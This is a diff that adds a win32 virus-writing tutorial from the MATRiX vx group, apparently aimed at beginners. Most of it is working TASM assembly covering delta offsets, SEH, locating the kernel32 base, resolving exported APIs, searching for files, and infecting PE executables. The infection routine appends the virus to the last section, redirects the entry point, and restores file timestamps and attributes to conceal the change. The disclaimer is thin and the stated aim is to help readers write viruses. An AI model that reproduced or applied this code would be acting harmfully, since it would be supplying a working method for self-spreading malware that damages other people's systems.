@@ -1,0 +1,779 @@
+
+
+---( win32 VX tutorial by mort[MATRiX] )------------------------------------
+
+ This article is for educational purpose only and  I AM  NOT responsibille
+ for anything nor my english, nor myself,...anyway, enjoy it...
+
+
+    
+---( forewords )------------------------------------------------------------
+    \\\\\\\\\\\\
+     
+ Well,  forewords,... i have no fucking idea what to write into this part.
+ Anyway, this  will be article for absolute lamie who wants to teach write
+ a win32 virii.  When i wanted to write  my first virii  (not so long ago)
+ i'd like to have something like this (hehe,  i had  LordJulus one, anyway
+ i wanna to write my own :)). You, the reader, are assumed to know some of
+ assembler coding (TASM forever:)).
+
+  index|
+  \\\\\\
+          I         - delta handle
+          II        - SEH
+          III       - kernell base
+          IV        - APIs
+          V         - search files
+          VI        - infect files
+          VII       - closing            |
+                                         |
+          appendix  - MZ and PE structure|
+          \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+          
+---( here we go - I. delta handle )-----------------------------------------
+    \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+    
+ Let see what is happened with infected file when is executed.  Mostly the
+ first  executed if not using EPO  (see my EPO article) is the virus code.
+ First the virus has  to do (if not using  some strange method) is getting
+ the  delta handle.  Delta handle  is numeric value  which  helps u access
+ the variables and other  stuff in virus body.  The easiest way to explain
+ is this code:
+
+       call @delta
+ @delta:
+       pop ebp               ;ebp contains address of  @delta right now in
+       sub ebp,offset @delta ;memory -> we must sub the linking @delta val
+
+  
+ To access variables use this code:
+
+       mov eax,[ebp + offset _variable]  ;get value of variable
+       lea eax,[ebp + offset _variable]  ;get offset of variable
+
+ Sure, u can use other registers to carry delta handle, but other register
+ are more helpfull in coding then ebp.
+
+
+
+---( II. SEH )--------------------------------------------------------------
+    \\\\\\\\\\
+    
+ SEH stands for  Structured Exception Handler and is use for avoiding BSOD
+ (blue screen of death :) which appears if there is happen some exception.
+ Most  usuall way  to create exception is write  to some read-only part of
+ memory. 
+
+ SEH  consist of two dwords. First points to  'old SEH' the second to 'new
+ SEH'. When host is loaded fs:[0] points to SEH. See the code:
+
+
+       push dword ptr fs:[0]      ;save new, now 'old SEH' to stack
+       call @SEH                  ;save new 'new SEH' to stack
+
+ @newSEH:
+       mov esp,[esp + 8]          ;load old stack              
+       pop eax                    ;clear stack
+       pop dword ptr fs:[0]       ;restore old SEH
+
+       jmp @whereEverUWant        ;if we're here -> something bad occured
+                                  ;better to leave back to host,...
+
+ @SEH:
+       ;now we have two dwords saved on stack - new and old SEH
+       
+       mov dword ptr fs:[0],esp   ;set new SEH 
+       
+       ;from this part we can safely write everywhere
+       ;if exception occurs code will jump to @newSEH label
+        
+ I have no idea how SEH is working inside, anyway this is all we need
+ to know,...:)
+
+  
+  
+---( III. kernell base )-----------------------------------------------------
+    \\\\\\\\\\\\\\\\\\\\
+    
+ Windows  kernell is connected to win32 subsystem which offers to us APIs.
+ In win NT  there's also  POSIX and OS/2 subsytem,  but  thats  not we are
+ interested in.  Win32 is the basic subsytem for windows. APIs are access-
+ able via DLLs mapped on process's address space. The most usefull DLL for
+ virii  is  kernell32.dll  (next only kernell).  To get APIs' address from
+ this  DLL we must found its base -  address in memory it starts on. There
+ are two ways i know to get kernell base.(well i know third, get base with
+ the help of import in infected host,...check Lord Julus's article).
+ 
+ The first one  is using the stack value right after host executing.  This
+ value is supposed to b from some part of kernell. So by this, we retrieve
+ some address  from kernell - we dont know where it is. Let see the things
+ we know:
+
+   - kernell32.dll is normal DLL file which start with MZ header
+   - kernel base is address align to 01000h due to intel page architecture
+   - kernell32.dll isnt endless :)
+
+ See the code:
+
+       mov eax,[esp]              ;get stack 'kernell' value
+       and eax,0fffff000h         ;set it to align value
+       mov ecx,050h               ;page numbers,...-1 could be good too
+   
+ @loopie:
+       cmp word ptr [eax],'ZM'    ;check if we found kernell MZ header
+       jz @mayBe
+
+ @eou:
+       sub eax,01000h             ;sub one page from 'base locator'
+       dec ecx                    ;decrease page counter
+       jnz @loopie
+       jmp @fakinWedr             ;no kernell - no virii
+
+ @mayBe:
+       xchg eax,ebx               ;save kernell base
+       add eax,[eax + 03ch]       ;get PE address from MZ header
+       cmp word ptr [eax],'EP'    ;check if PE header
+       xchg eax,ebx
+       jnz @eou
+
+       ;if our code will come here there is kernell base in eax
+
+
+ The  second way do not use  "stack kernel value",  but using SEH to check
+ the base. There're some version  of windows  ->  there're  some  versions 
+ kernell bases. If we have some bases we can use them all to check if it's
+ kernell base. 
+
+ See the code (fragments of Win32.ls):
+ 
+          cld                                       ;set direction
+          lea esi,[ebp + offset _kernells - @delta] ;offset of kernnels
+
+  @nextKernell:
+          lodsd                ;load base to check
+          push esi             ;save kernells offset location
+          inc eax              ;check if we checked the last base
+          jz @bad              ;yea -> no kernell base found
+
+          push ebp             ;save delta handle
+          
+          call @kernellSEH     ;standard SEH call :)
+          
+          mov esp,[esp + 08h]  ;restore stack
+          
+  @bad1:
+          pop dword ptr fs:[0] ;restore old SEH
+          pop eax              ;clear stack
+          pop ebp              ;get back delta handle
+          pop esi              ;get pointer to next kernell base
+          jmp @nextKernell     ;go to check next kernell base
+
+  @bad:
+          pop eax              ;we failed,...
+          jmp @returnHost
+ 
+  ;the most common kernell bases
+  _kernells           label
+                    dd 077e80000h - 1   ;NT 5
+                    dd 0bff70000h - 1   ;w9x
+                    dd 077f00000h - 1   ;NT 4
+                    dd -1
+ 
+  @kernellSEH:
+          push dword ptr fs:[0]         ;setup new SEH
+          mov dword ptr fs:[0],esp
+          mov ebx,eax                   ;save base
+          xchg eax,esi     
+          xor eax,eax
+          lodsw                         ;read 1st word from base
+          not eax                       ;check if it's MZ - start of EXE
+          cmp eax,not 'ZM'          
+          jnz @bad1                     ;nope -> try next base
+          mov eax,[esi + 03ch]          ;we found MZ-> check PE header
+          add eax,ebx                   ;in eax is relative - add base
+          xchg eax,esi                  
+          lodsd                         ;read 1st dword from PE
+          not eax
+          cmp eax,not 'EP'        ;check if PE -> found PE -> found kernell
+          jnz @bad1
+          
+          pop dword ptr fs:[0]    ;set old SEH
+          pop eax ebp esi         ;clear stack
+          
+          ;ebx - kernel base, ebp - delta handle
+
+
+ We neednt check kernell base by checking MZ and PE header. There's
+ other way. Assume we have base in eax: (see PE structure)
+
+          cmp eax,[eax + 0b4h]
+          jnz @fuck
+          cmp eax,[eax + 0104h]         ;base stored in win2000 kernell
+          jnz @fuck
+
+ We have kernell base -> we can search APIs,...
+ 
+ 
+   
+---( IV. APIs )-------------------------------------------------------------
+    \\\\\\\\\\\
+    
+ API stands for  Application Programming Interface.  It's set of functions
+ we can use.  APIs are accessable by case sensitive names.  Due to writing
+ normal  program,  we can use APIs by normal way - not in virus.  In virii
+ we must search for APIs in  DLLs (DLL  stands for  dynamic-link library.)
+ which  export  this  APIs.  Most  usefull  APIs  for  virus  work  is  in 
+ kernell32.dll ( we  have its  base from III.part ).  There are  DLLs like
+ GDI32.dll  and such with  other APIs,  anyway kernell APIs are the basic.
+ To find API adsresses we must know some of DLL structure.
+ 
+ win32 EXE and DLL file structure
+ (see appendix A for full MZ and PE record)
+ 
+ - start of file -
+ 0        db 'MZ'             mark of DOS executable
+ ...
+ 03ch     dd ?                relative address of PE header in file
+ ...
+ 0        db 'PE',0,0         mark of PE header
+ ...
+ 078h     dd ?                export section relative address
+ ...
+ 
+ By  the export section address we'll get into export section.  All u need
+ to know:
+ 
+ - start of the export section -
+  ...
+ 018h     dd ?      number of names               1)
+ 01ch     dd ?      address of functions          2)
+ 020h     dd ?      address of names              3)
+ 024h     dd ?      address of odinals            4)
+ ...
+ 
+ ad 1) number of names of APIs exported by DLL
+ ad 2) pointer to array of pointers to APIs addresses
+ ad 3) pointer to array of pointers to APIs' names
+ ad 4) pointer to array of pointers to APIs' ordinals
+ 
+ Each  API  has a name and  an ordinal number  by which  we will check the
+ address. Well, lets go search API step by step. Imagine we wanna find API
+ address for  UncleFuckerAPI.  We search  for 'UncleFuckerAPI'  string  in
+ array of  API names  and must save  the index of API in search. We'll use
+ this index to get the ordinal number -> via it we'll get the API address.
+
+ 
+ - array of names' pointers
+   0      1          x
+ [ dd ] [ dd ] ... [ dd ]
+   |                 |
+   |                 '-> 'UncleFuckerAPI'
+   '-> 'AddAtomA'
+ 
+ - array of ordinals
+      x*2 -------->--.
+                     |
+  [ dw ] [ dw ] ... [ dw ]
+                        |
+                        '---> y
+                       
+ - array of addresses
+      y*4 -----------.
+                     |
+  [ dd ] [ dd ] ... [ dd ]
+                        |
+                        '---> UncleFuckerAPI address
+
+
+ Now, the whole code for search all APIs we need:
+ 
+ 
+     ;eax and ebx contains kernell base
+     
+     add eax,[eax + 03ch]     ;get PE of kernell
+     mov eax,[eax + 078h]     ;get export section relative
+     add eax,ebx              ;get export section address
+     add eax,018h             ;move to number of names
+     xchg eax,esi
+          
+     push _APIcount           ;push number of API we want
+     
+     lodsd          ;load number of API names
+     push eax       ;save it to stack
+     inc eax        ;value we will decrement t get index of name
+     push eax       ;save it to stack
+     lodsd          ;load pointer to API adresses
+     push eax       ;save it to stack
+     lodsd          ;load pointer to names' addresses
+     push eax       ;save it to stack
+     lodsd          ;load pointer to ordinals' adresses
+     push eax       ;save it to stack
+     
+     mov eax,[esp + 4]        ;get names array relative
+     add eax,ebx              ; '-> get right address
+     xchg eax,esi             
+
+  @nextAPI:
+     dec dword ptr [esp + 0ch]
+        
+     lodsd          ;get name's relative
+     add eax,ebx    ; '-> get right address
+
+     ;we have pointer to API name and we must recognize if this is API
+     ;we need -> there're many ways of checking this,...find your own
+     ;eg. check the names,...see appendix
+     
+     mov eax,[esp + 010h]     ;get number of exported names
+     sub eax,[esp + 0ch]      ;decremented number -> eax holds the index
+     shl eax,1                ;x*2 -> eax
+     add eax,[esp]            ;get ordinal possition (relative)
+     add eax,ebx              ;'-> get right address
+     push esi                 ;save names' pointer possition
+     xchg eax,esi             
+     xor eax,eax              
+     lodsw                    ;load word ordinal value to eax (y)
+     shl eax,2                ;y*4 -> eax
+     add eax,[esp + 0ch]      ;get address possition (relative)
+     add eax,ebx              ;'-> get right address
+     xchg eax,esi
+     lodsd                    ;load address of API (relative)
+     add eax,ebx              ;'-> get right address
+     
+     ;we have API address in eax -> save it anywhere u want for later use
+     
+     pop esi                    ;restore names' pointer
+     dec dword ptr [esp + 014h] ;decrement out API counter
+     jnz @nextAPI
+        
+  @lastAPIDone:
+     add esp,018h               ;clear stack
+
+     ;here, we have all APIs we need
+     
+
+ The last i can mention is calling the API. Imagine we have and named 
+ array of APIs' addresses:
+ 
+        ..
+        _xAPI                 dd ?
+        _UncleFuckerAPI       dd ?
+        ..
+        
+        push parameter1                 ;store parameters to stack
+        push parameter1
+        ...
+        push parameterX
+        call [ebp + _UncleFuckerAPI]    ;call API
+        
+  
+ ---( appendix )-----------------------------------------------------------
+     \\\\\\\\\\\
+     
+ It's obvious that to check if the  API name we have is the one we need we
+ need a name of this API in our virii to compare. Thats the one way: carry
+ API names of APIs we need and compare them with the name. Another way is,
+ we neednt hold long names of API, we can carry only their CRCs -> we need
+ some  function that count value for each API we need.  This value must be
+ unific.  Have this we count the value of checked name and compare it with
+ our value -> if pass, we have our API.
+  
+ PS last comment to APIs' names - they are store in alphabetical order
+  
+
+
+---( V. search files )------------------------------------------------------
+    \\\\\\\\\\\\\\\\\\
+    
+ If u're writing virii, u'r going to infect some files.  To work with file
+ we  need  it's full path.  There several ways to get it. The  most common
+ is search via  FindFirstFileA  (FFF)  and  FindNextFileA  API (FNF).  FFF
+ finds  the  first  file in  current directory  and returns the  handle of 
+ search. FNF search for  next  files in  current  directory and needs  the
+ handle of search from FFF like parameter.
+ 
+  push offset File Search structure
+  push file mask to find
+  call FindFirstFile
+  \\\\\\\\\\\\\\\\\\\
+ 
+  returns hadnle of search
+   
+  push offset File Search structure
+  push handle given from FindFirstFileA call
+  call FindNextFileA
+  \\\\\\\\\\\\\\\\\\\
+  
+  returns 1 if succed, 0 if fail
+  
+ File Search structure
+ 
+  max_path equ 260                                  
+  filetime                       struc
+         FT_dwLowDateTime        dd ?
+         FT_dwHighDateTime       dd ?
+  filetime                       ends
+  fileSearc                      struc
+         FileAttributes          dd ?
+         CreationTime            filetime ?        
+         LastAccessTime          filetime ?        
+         LastWriteTime           filetime ?        
+         FileSizeHigh            dd ?
+         FileSizeLow             dd ?
+         Reserved0               dd ?
+         Reserved1               dd ?
+         FileName                db max_path dup(?)
+         AlternateFileName       db 13 dup(?)     
+                                 DB 3 DUP (?)      
+  fileSearch                      ends
+                                                   
+ 
+ I think parameters are clear.  After succesfull calling FFF or FNF this
+ structure will be filled with data about founded file.
+
+ If we no longer need the handle returned from FFF it's better to close it
+ via FindClose API.
+ 
+  push search handle
+  call FindClose
+  \\\\\\\\\\\\\\\
+ 
+ FFF and FNF search for files in current directory. There're APIs to get
+  and set current directory - Get(Set)CurrentDirectoryA.
+ 
+  push offset of buffer to store the current path
+  push size of buffer to fill
+  call GetCurrentDirectoryA
+  \\\\\\\\\\\\\\\\\\\\\\\\\\
+  
+  returns lenght of returned string.
+  
+  push offset of path to set
+  call SetCurrentDirectoryA
+  \\\\\\\\\\\\\\\\\\\\\\\\\\
+  
+  returns: if succed the return value is nonzero
+  
+ There're APIs to get the some system directories:
+ GetWindowsDirectoryA and GetSystemDirectoryA
+ 
+  push size of buffer to fill
+  push offset of buffer to store the windows path
+  call GetWindowsDirectoryA
+  \\\\\\\\\\\\\\\\\\\\\\\\\\
+  
+  push size of buffer to fill
+  push offset of buffer to store the system path
+  call SystemDirectoryA
+  \\\\\\\\\\\\\\\\\\\\\\
+  
+ This APIs returns lenght of returned string.
+  
+ Thats the basic  informations u  need to write some search routine.  Sure
+ there're more APIs  deal with file searching.  See SDK reference for them
+ i wont waste the space with them,..All for file searching.
+  
+
+  
+---( VI. infect files )-----------------------------------------------------
+    \\\\\\\\\\\\\\\\\\\
+    
+ Well,  file infecting,... to infect file we need some  APIs to deal with.
+ Windows use way of  working with file called  file mapping. It means that
+ file is mapped on some address in proces' address space. If u change some
+ byte in this address space,  u change  the byte in file. I described file
+ mapping in my IPC article, so i wont describe it again. Go and read it,..
+ and assume that we have base address the file to infect is loaded on.
+ 
+ But  first some words bout  PE windows PE EXE structure.  Windows code is
+ divorced to sections  -  section for code,  for (un)initialized data, for
+ debug informations,... and so on.  Each section has a header.  Headers of
+ sections  are stored  behind the PE header.  We can add  new section with
+                                 our virri, or(more usuall) we can enlarge
+  .---------------------------.  the last section and  copy virii into it,
+ /|MZ header                  |  and  change  entrypoint  to point  to our 
+|P|---------------------------|  code.  Well,  there  exist  many  ways of
+|E|PE header                  |  PE infecting,  anyway,  this  is the best
+| |---------------------------|  for  understand.  Well, lets go  step  by
+|e|CODE section header        |  step.
+|x|...                        |  First we need  to check if loaded file is
+|e|DATA section header        |  PE executable one:
+|c|...                        |  
+|u|unclefucker section header |  eax - mapped file address
+|t|...                        |  
+|a|---------------------------|         mov edi,eax
+|b|CODE data                  |         mov eax,'MZZM'
+|l|...                        |         cmp ax,word ptr [edi]
+|e|---------------------------|         jz @foundMZ
+ \|DATA data :)               |         shr eax,010h
+  |...                        |         cmp ax,word ptr [edi]
+  |---------------------------|         jnz @notMZ
+  |unclefucker data           |
+  |...                        |  @foundMZ:
+  '---------------------------'
+
+ I check the  DOS header for MZ and ZM.  To say the truth i never saw 'ZM'
+ string in DOS header, but i read somewhere it can be used,...
+ Get PE header:
+  
+          mov eax,[edi + 3ch]           ;get PE relative
+          add eax,edi                   ;and right address
+          xchg esi,eax
+          lodsd                         ;load PE sign
+          not eax
+          cmp eax,not 'EP'              ;check PE sign
+          jnz @notPE                    ;leave if not PE
+
+ Now we have PE pointer. It's good to save some values from PE header
+ for later use. Sections and whole file are aligned to some values.
+ It's section align and file align value from PE header.
+ 
+          sub esi,4                     ;get PE address
+          mov ebx,edi                   ;ebx -> file base
+
+          mov eax,[esi + 038h]          ;get section align value
+          mov [ebp + _secAlign],eax     ;and save it
+          mov eax,[esi + 03ch]          ;get file align value
+          mov [ebp + _fileAlign],eax    ;and save it
+          
+          mov eax,[esi + 074h]          ;get dir. number (see PE header)
+          shl eax,3                     ;8 bytes for each record
+          push eax                      ;and save it
+          xor eax,eax
+          mov ax,[esi + 06h]            ;load number of sections
+          mov ecx,028h                  ;28 bytes for each section header
+          dec eax                       ;seeking for last,...
+          mul ecx                       ;and mul it
+          pop edi                       ;load dir size
+          add edi,eax                   ;add headers - 1 size
+          add edi,esi                   ;add PE offset
+          add edi,078h                  ;add PE size
+          
+  Now edi points to last section header. It's the time to show header 
+  structure:
+ 
+  offset  
+   0       db 8 dup(?)         ;name of header eg. 'text' for code
+   8       dd ?                ;virtual size
+   0ch     dd ?                ;virtual RVA
+   010h    dd ?                ;physical size
+   014h    dd ?                ;physical offset
+           dd ?,?,?
+   024h    dd ?                ;sections flags
+
+ Virtual  RVA and size values are used  when the process is loaded in mem.
+ or physical use(data stored on disk) is used physical size and offset.
+  
+  _newFileSize      = infect file size before infection,...
+  _vSize            = virus size
+
+          xor edx,edx
+          mov eax,[edi + 010h]          ;get physical size of last section
+          add eax,_vSize                ;add our virri to it
+          mov ecx,[ebp + _fileAlign]    ;use file align to align it
+          div ecx                       ;div it
+          inc eax                       ;inc it to be align
+          mul ecx                       ;and mul it
+          
+          sub eax,[edi + 010h]          ;get aligned delta
+          add [esi + 050h],eax          ;and increase image size
+          add [ebp + _newFileSize],eax  ;add aligned size
+          mov edx,[edi + 010h]          ;save old physical size
+          add [edi + 010h],eax          ;and set new one
+
+          or dword ptr [edi + 024h],0a0000020h ;set flags - see later
+          mov eax,[edi + 0ch]           ;get physical offset
+          add eax,edx                   ;and get our copy address
+
+          xchg [esi + 028h],eax         ;set/get new/old entrypoint
+          add eax,[esi + 034h]          ;add imagebase to get entryaddress
+          mov dword ptr [ebp + _hostIP],eax       ;save old one
+
+          push edx
+          
+          xor edx,edx
+          mov eax,[edi + 08h]           ;get virtual size
+          mov ecx,[ebp + _secAlign]     ;use section align to align it
+          div ecx                       ;and dic it
+          inc eax                       ;inc it to be align
+          mul ecx                       ;and mul it,...:)
+          mov [edi + 08h],eax           ;set new virtual size
+
+          pop edx
+          
+          mov eax,[edi + 014h]          ;get physical offset
+          add eax,edx                   ;add physical size
+          add eax,ebx                   ;add file base
+          xchg eax,edi                  
+
+          lea esi,[ebp + @virusStart]   ;get our virus entry
+          mov ecx,_vSize                ;virus size
+          rep movsb                     ;and copy it to host
+          
+ About the falgs,... each section  has a flag's dword.  It set the section
+ read,write,read/write,...we must set last section writeable, coz we write
+ into :),... we must or it with flags u see in code,...:)
+
+ Infection  is  nearly  done.  Now  we  must set new file  size  stored in
+ _newFileSize  variable.  We  set file pointer  to end  of file by calling
+ SetEndOfFile and set end of file by same-naming API.
+
+          push 0 0                      ;not important, but needed,...:)
+          push dword ptr [ebp + _newFileSize]     ;new file size,...
+          push dword ptr [ebp + _fileHandle]      ;handle given from
+          call SetFilePointer                     ;CreateFileA API
+
+          push dword ptr [ebp + _fileHandle]      ;file handle -//-
+          call SetEndOfFile
+
+ Next thing u r expect to do is set old time of file change. It's stored
+ in file search structure. We do it by calling SetFileTime API.
+ 
+          lea eax,[ebp + _fileSearch.CreationTime]
+          push eax                                ;CreationTime
+          add eax,8
+          push eax                                ;LastAccessTime
+          add eax,8
+          push eax                                ;LastWriteTime
+          push dword ptr [ebp + _fileHandle]      ;file handle
+          call SetFileTime
+
+ It may  occurs that  file  will be have an readable attribut.  We can set
+ normal attribut before  mapping the file by SetFileAttributeA. After work
+ is done we set old attribute which is stored in file search structure.
+ 
+         / 020h     ;normal attribute
+  push -|
+         \ dword ptr [ebp + _fileSearch.FileAttributes] ;old attribute
+          
+          lea eax,[ebp + _fileSearch.FileName]
+          push eax
+          call SetFileAttributes
+
+
+ And thats all for infecting,...
+
+
+ 
+---( VII. closing )---------------------------------------------------------
+    \\\\\\\\\\\\\\\
+    
+  Closing,... hm, if u get here,  you might read the  article and it might
+  helps u,  i hope there's not so many mistakes i thing,...:)  Please feel
+  free to write me any comments or ideas...
+
+
+                                        mort[MATRiX]
+   .
+   |\
+   | |.--.   -|-.
+   | ||  |.--|| |
+   |  \  m o r|t .
+ .-'-----'\._''--'-.
+ '--[MATRiX]-------'
+ [mort@matrixvx.org]
+  \\\\\\\\\\\\\\\\\\
+
+
+---( appendix )-------------------------------------------------------------
+    \\\\\\\\\\\
+    
+ (this info is not my source,..im not responsibile for bad info,...)
+
+ MZ record
+ 
+ ofset 
+ 
+   0                dw 'ZM'             ;MZ identificator
+   2                dw ?                ;last page bytes
+   4                dw ?                ;file pages
+   6                dw ?                ;reloc
+   8                dw ?                ;header size in paragraphs
+   0ah              dw ?                ;minimum paragraph needed
+   0ch              dw ?                ;maximum paragraphs needed
+   0eh              dw ?                ;initial SS
+   010h             dw ?                ;initial SP
+   012h             dw ?                ;checksum
+   014h             dw ?                ;initial IP
+   016h             dw ?                ;initial CS   
+   018h             dw ?                ;reloc address
+   01ah             dw ?                ;overlay number
+   01ch             dd ?                ;reserved
+   020h             dw ?                ;OEM dentifier
+   022h             dw ?                ;OEM information
+          ....                          ;reserved
+   03ch             dw ?                ;PE header relative offset
+   
+
+ PE record
+ 
+ offset
+  0                 dd 'EP'             ;PE indentificator
+  4                 dw ?                ;CPU type
+  6                 dw ?                ;number of sections
+  8                 dd ?                ;date time
+  0ch               dd ?                ;COFF pointer
+  010h              dd ?                ;COFF size
+  014h              dw ?                ;NT header size
+  016h              dw ?                ;PE flags
+ nt header
+  018h              dw ?                ;NT header ID
+  01ah              db ?                ;linker major number
+  01bh              db ?                ;linker minor number
+  01ch              dd ?                ;code size
+  020h              dd ?                ;idata size
+  024h              dd ?                ;udata size
+  028h              dd ?                ;entrypoint RVA
+  02ch              dd ?                ;code base
+  030h              dd ?                ;data base
+  034h              dd ?                ;image base
+  038h              dd ?                ;sections align
+  03ch              dd ?                ;file align
+  040h              dw ?                ;OS major number
+  042h              dw ?                ;OS minor number
+  044h              dw ?                ;user major
+  046h              dw ?                ;user minor
+  048h              dw ?                ;subsys major
+  04ah              dw ?                ;subsys minor
+  04ch              dd ?                ;reserved
+  050h              dd ?                ;image size
+  054h              dd ?                ;header size
+  058h              dd ?                ;checksum
+  05ch              dw ?                ;subsystem
+  05eh              dw ?                ;DLL flags
+  060h              dd ?                ;stack reserve
+  064h              dd ?                ;stack commit
+  068h              dd ?                ;heap reserve
+  06ch              dd ?                ;heap commit
+  070h              dd ?                ;loader flags
+  074h              dd ?                ;number of RVA sizes
+
+  078h              dd ?                ;export RVA
+  07ch              dd ?                ;export size
+  080h              dd ?                ;import RVA
+  084h              dd ?                ;import size
+  088h              dd ?                ;resource RVA
+  08ch              dd ?                ;resource size
+  090h              dd ?                ;exception RVA
+  094h              dd ?                ;exception size
+  098h              dd ?                ;security RVA
+  09ch              dd ?                ;security size
+  0a0h              dd ?                ;fixup RVA
+  0a4h              dd ?                ;fixup size
+  0a8h              dd ?                ;debug RVA
+  0ach              dd ?                ;debug size
+  0b0h              dd ?                ;description RVA
+  0b4h              dd ?                ;description size
+  0b8h              dd ?                ;machine RVA
+  0bch              dd ?                ;machine size
+  0c0h              dd ?                ;tls RVA
+  0c4h              dd ?                ;tls size
+  0c8h              dd ?                ;loadconfig RVA
+  0cch              dd ?                ;loadconfig size
+                    dd ?,?              ;hm? :)
+  0d8h              dd ?                ;iat RVA
+  0dch              dd ?                ;iat size
+                    dd ?,?
+                    dd ?,?
+                    dd ?,?
